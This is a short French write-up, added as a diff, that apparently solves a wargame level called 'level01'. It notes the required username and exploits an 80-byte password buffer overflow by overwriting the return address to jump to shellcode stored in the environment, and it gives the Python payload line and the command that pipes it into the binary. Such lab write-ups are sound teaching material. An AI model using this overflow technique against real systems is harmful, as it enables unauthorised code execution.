@@ -1,0 +1,8 @@
+on dessamble le code avec gdb et on voit deux fonction verify_user_name et verify_user_pass
+on voit avec les offset des strings qu'il faut que le username soit egale a dat_wil
+et ensuite on exploite un buffer overflow sur le password pour executer un shellcode mis dans l'env
+le buffer est de 80 
+du coup ->
+
+python -c "print 'dat_wil' + '\n' + 'A' * 80  + '\x19\xde\xff\xff'+  '\n'" > /tmp/toto
+cat /tmp/toto - | ./level01
